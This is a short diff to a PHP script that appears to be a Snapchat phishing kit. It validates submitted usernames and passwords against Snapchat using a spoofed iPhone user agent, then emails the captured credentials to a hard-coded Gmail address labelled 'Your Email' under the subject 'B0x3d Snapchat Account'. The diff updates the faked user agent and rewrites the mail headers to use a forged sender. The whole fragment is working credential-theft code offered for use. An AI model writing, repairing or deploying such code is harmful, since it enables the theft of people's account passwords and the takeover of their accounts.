@@ -60,7 +60,7 @@ function login($username,$password) {
 		'Connection: Keep-Alive'
 	));
 	curl_setopt($snapchat, CURLOPT_POSTFIELDS, "password=$password&timestamp=$time&username=$username&req_token=$req");
-	curl_setopt($snapchat, CURLOPT_USERAGENT, "Snapchat/10.15.0.4 (iPhone6,2; iOS 9.3.3; gzip)");
+	curl_setopt($snapchat, CURLOPT_USERAGENT, "Snapchat/10.17.0.5 (iPhone6,2; iOS 9.3.2; gzip)");
 	$response = curl_exec($snapchat);
 	curl_close($snapchat);
 	return $response;
@@ -70,8 +70,10 @@ function mailer($username,$password) {
     $to = "leetroot3d@gmail.com"; # Your Email
     $subject = "B0x3d Snapchat Account";
     $message = "Username:$username\nPassword:$password";
-    $headers = "From: ".$from. "\r\n";
-    $sent = mail($to, $subject, $message, $headers);
+    $headers = 'From: webmaster@example.com' . "\r\n" .
+		'Reply-To: webmaster@example.com' . "\r\n" .
+		'X-Mailer: PHP/' . phpversion();
+    return mail($to, $subject, $message, $headers);
 }
 #######################################################################
 if($_POST['login']){
